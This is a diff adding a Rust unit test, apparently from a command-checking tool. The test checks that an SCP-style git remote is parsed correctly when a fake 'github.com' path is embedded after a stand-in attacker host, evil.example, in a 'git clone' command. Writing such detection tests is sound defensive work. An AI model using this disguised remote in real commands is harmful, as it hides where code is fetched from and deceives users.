+    #[test]
+    fn scp_remote_path_with_embedded_scheme_keeps_the_transport_host() {
+        let raw = "git@evil.example://github.com/org/repo.git";
+        let spec = parse_scp_remote_spec(raw, ShellType::Posix).unwrap();
+        assert_eq!(spec.host, "evil.example");
+        assert_eq!(spec.path, "//github.com/org/repo.git");
+        let urls = extract_urls(&format!("git clone {raw}"), ShellType::Posix);
+        assert!(urls
+            .iter()
+            .any(|url| url.parsed.host() == Some("evil.example")));
+        assert!(!urls
+            .iter()
+            .any(|url| url.parsed.host() == Some("github.com")));
     }
 }
